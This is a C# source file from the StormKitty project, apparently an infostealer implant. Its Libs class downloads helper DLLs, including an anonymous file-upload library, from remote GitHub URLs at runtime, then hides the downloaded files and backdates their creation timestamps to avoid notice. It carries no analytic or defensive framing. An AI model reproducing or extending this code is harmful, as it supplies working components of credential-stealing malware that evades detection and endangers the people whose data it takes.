using System;
using System.IO;
using System.Net;
using StormKitty.Implant;

namespace StormKitty
{
    internal sealed class Libs
    {

        public static string AnonFile = "https://raw.githubusercontent.com/LimerBoy/StormKitty/master/StormKitty/stub/packages/AnonFileApi.1.14.6/lib/net40/AnonFileApi.dll";
        public static string ZipLib = "https://raw.githubusercontent.com/LimerBoy/StormKitty/master/StormKitty/stub/packages/DotNetZip.1.13.8/lib/net40/DotNetZip.dll";
        public static bool LoadRemoteLibrary(string library)
        {
            int i = 0;
            string dll = Path.Combine(Path.GetDirectoryName(Startup.ExecutablePath), Path.GetFileName(new Uri(library).LocalPath));
            
            while (i < 3)
            {
                i++;
                if (!File.Exists(dll))
                {
                    try
                    {
                        using (var client = new WebClient())
                            client.DownloadFile(library, dll);
                    }
                    catch (WebException)
                    {
                        Logging.Log("LibLoader: Failed to download library " + dll);
                        System.Threading.Thread.Sleep(2000);
                        continue;
                    }

                    Startup.HideFile(dll);
                    Startup.SetFileCreationDate(dll);
                }
            }
            return File.Exists(dll);
        }
    }
}
